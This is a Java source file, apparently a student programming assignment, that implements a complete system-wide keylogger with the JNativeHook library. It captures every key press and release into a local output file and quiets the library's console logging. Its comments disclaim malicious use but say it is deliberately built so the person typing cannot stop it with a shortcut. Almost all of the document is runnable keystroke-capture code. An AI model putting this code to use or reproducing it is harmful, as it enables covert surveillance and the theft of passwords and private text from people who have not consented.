//This program is an exercise and will not be used maliciously
//
//Filipp Rondel
//Programming Assignment 2
//
//This program uses JNativeHook library to get the precise names of all the keys on any keyboard
//
//Originally it was planned to write this program so that it would record every keystroke like text;
//meaning every key would be treated like it is in a document when you type (enter = new line, backspace = erase previous character, etc).
//After some testing I realised that there are shortcuts that people often use when they type and they would not be recorded. 
//Also, extensive use of backspace would render the key-logger useless. Which is why it simply records every keystroke and separates modifiers
//and punctuation from alpha-numerical characters. The program continuously records keystrokes until it is terminated.
//
//The output file is stored in the root folder.
//
//It would be very easy to implement a shortcut to stop the key-logger, but I consider a realistic situation where a human should not even 
//accidentally be able to disable the key-logger with a shortcut, but the process itself has to be shut down, or in this case the program has
//to be terminated manually.
//
//View output with a formatted text editor, such as Notepad++, to see the modifiers 

package keyLogger;

import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

//implementing key-listener class
public class keylogger implements NativeKeyListener{

	//new public string that would hold all recorded key-presses
	public String captured = "";
	
	public static void main(String[] args) {
		
		//try catch block to register the NativeHook
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		
		//This gets the logs of org.jnativehook to set the level to off, which effectively disables console output 
		//for unnecessary things such as mouse movements
		Logger logs = Logger.getLogger(GlobalScreen.class.getPackage().getName()); 
		logs.setLevel(Level.OFF);
		
		//Adds key listener
		GlobalScreen.getInstance().addNativeKeyListener(new keylogger());
		System.out.println("The key-logger has been started.");
		System.out.println("You can start typing now.");
	}

	@Override
	//Method deals with the keys pressed down
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		//Gets the keycode of the key that was pressed
		String keyStroke = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		//Separating the alpha-numerical characters from punctuation and modifiers
		//If the character is punctuation or a modifier it gets moved to it's own line
		if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() > 1) {
			captured = captured + "\n" + "Modifier Key Pressed: " + keyStroke + "\n";
		}
		//if the character is alpha-numerical then it gets recorded in the line
		else {
			captured += keyStroke;
		}
		
		//recording everything to an output file
		try (PrintWriter out = new PrintWriter("output.txt", "UTF-8")) {
            out.write(captured);
        
        //catches the file not found exception
        } catch (FileNotFoundException e1) {
			e1.printStackTrace();
		//catches the unsupported encoding exception
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
		}

	}
	
	@Override
	//This method allows you to know what letters/numbers were modified
	//with a modifier key
	public void nativeKeyReleased(NativeKeyEvent e) {
		
		//string variable to hold the keystrokes
		String keyStroke = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		//if loop to filter out the alpha-numerical characters and have only modifiers
		if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() > 1) {
			captured = captured + "\n" + "Modifier Key Released: " + keyStroke + "\n";
		}
	}
	//***Unimplemented*** 
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
	}
}
